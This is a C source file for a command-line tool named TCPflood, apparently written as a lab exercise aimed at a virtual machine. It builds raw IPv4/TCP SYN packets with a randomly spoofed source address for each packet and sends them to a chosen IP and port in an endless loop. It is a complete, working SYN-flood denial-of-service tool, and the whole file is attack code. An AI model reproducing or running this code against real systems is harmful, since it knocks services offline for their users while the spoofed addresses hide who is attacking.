#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/types.h>


typedef unsigned char u_char;
#include "header.h" 

#define SOURCE_PORT 4200
#define PACKET_LENGTH 4096
#define TEST_STRING "TEST Szymon Borzdynski"

// Counter for sent packets
int sent_packets = 0;


char *dest_ip;
int dest_port;

// https://man7.org/linux/man-pages/man3/sendto.3p.html
// ssize_t sendto(int socket, const void *message, size_t length,
// int flags, const struct sockaddr *dest_addr,
// socklen_t dest_len);


// TCP header
struct pseudo_tcp_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t reserved;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

int create_socket() {
    // for custom packet
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    int on = 1;
    // IP_HDRINCL - Raw sockets
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    return sockfd;
}

unsigned short intchecksum(unsigned short *ptr, int bytes_count) {
    long sum = 0;
    unsigned short oddbyte;
    unsigned short answer; 

    while (bytes_count > 1) {
        sum += *ptr++;
        bytes_count -= 2;
    }
    
    if (bytes_count == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr; 
        sum += oddbyte;
    }

    sum = (sum & 0xffff) + (sum >> 16); //
    sum = sum + (sum >> 16);
    answer = (unsigned short) ~ sum;

    return answer;
}


int prepare_packet(struct iphdr *iph, struct tcphdr *tcph, struct pseudo_tcp_header *psh_ptr, char *data) {
    char ipa[15];
    char *random_ip = ipa;
    memset(random_ip, 0, 15);
    
    // Random IP for packet
    sprintf(random_ip, "%d.%d.%d.%d", rand()%255, rand()%255, rand()%255, rand()%255);

    // IP header
    memset(iph, 0, sizeof(struct iphdr));
    iph->version = 4; 
    iph->ihl = 5;     // header len
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
    iph->id = htons(rand() % 65536);
    // iph->id = htonl(1000); // packet ID randomize ?
    iph->frag_off = 0;
    iph->ttl = 255; // time to live
    iph->protocol = IPPROTO_TCP; // TCP
    iph->check = 0;
    iph->saddr = inet_addr(random_ip); // random IP as source
    inet_pton(AF_INET, dest_ip, &(iph->daddr)); // Destination VM
    iph->check = intchecksum((unsigned short *)iph, sizeof(struct iphdr));

   
    memset(tcph, 0, sizeof(struct tcphdr));
    tcph->source = htons(SOURCE_PORT);
    tcph->dest = htons(dest_port);
    tcph->seq = htonl(0); // randomize ?
    tcph->ack_seq = 0; // TODO fix
    tcph->doff = 5;  // 5 32-bit words 
    
    // SYN bit to 1 to start a handshake
    tcph->syn = 1; 
    
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    // Pseudo header - psh (change)
    // server will drop packet if checksum wrong
    memset(psh_ptr, 0, sizeof(struct pseudo_tcp_header));
    psh_ptr->source_address = inet_addr(random_ip);
    //psh_ptr->dest_address = htonl(dest_port);
    psh_ptr->dest_address = iph->daddr;
    psh_ptr->reserved = 0;
    psh_ptr->protocol = IPPROTO_TCP; 
    psh_ptr->tcp_length = htons(sizeof(struct tcphdr) + strlen(data));

    int psize = sizeof(struct pseudo_tcp_header) + sizeof(struct tcphdr) + strlen(data);
    char *pseudogram = (char *)malloc(psize);
    memset(pseudogram, 0, psize);
    memcpy(pseudogram, (char*) psh_ptr, sizeof(struct pseudo_tcp_header));
    memcpy(pseudogram + sizeof(struct pseudo_tcp_header), tcph, sizeof(struct tcphdr) + strlen(data));
    tcph->check = intchecksum((unsigned short *) pseudogram, psize); // final checksum
    free(pseudogram);

    return 0;
}






int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("./TCPflood IP PORT\n");
        return 1;
    }

    dest_ip = argv[1];
    dest_port = atoi(argv[2]);

    int sockfd = create_socket();

    // Array filled with zeros packet
    char packet[PACKET_LENGTH], *data;
    memset(packet, 0, PACKET_LENGTH);

    // ip header template at start of array
    struct iphdr *iph = (struct iphdr *)packet;
    // tcp header template after it
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct pseudo_tcp_header psh;

    // String to payload
    char data_string[] = TEST_STRING;
    data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
    strncpy(data, data_string, strlen(data_string));


    // destination for sendto
    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET; // IPv4
    dest.sin_port = htons(dest_port); //port
    inet_pton(AF_INET, dest_ip, &(dest.sin_addr)); // ip str to bin form


    

    while (1) {
        prepare_packet(iph, tcph, &psh, data);

        if (sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr *)&dest, sizeof(struct sockaddr)) == -1) {
            printf("Error sendto\n");
        }

        memset(packet, 0, PACKET_LENGTH);

        sent_packets++;
        printf("Sent packets: %d\n", sent_packets);
    }

    return 0;
}

// https://man7.org/linux/man-pages/man3/setsockopt.3p.html

// https://man7.org/linux/man-pages/man2/socket.2.html






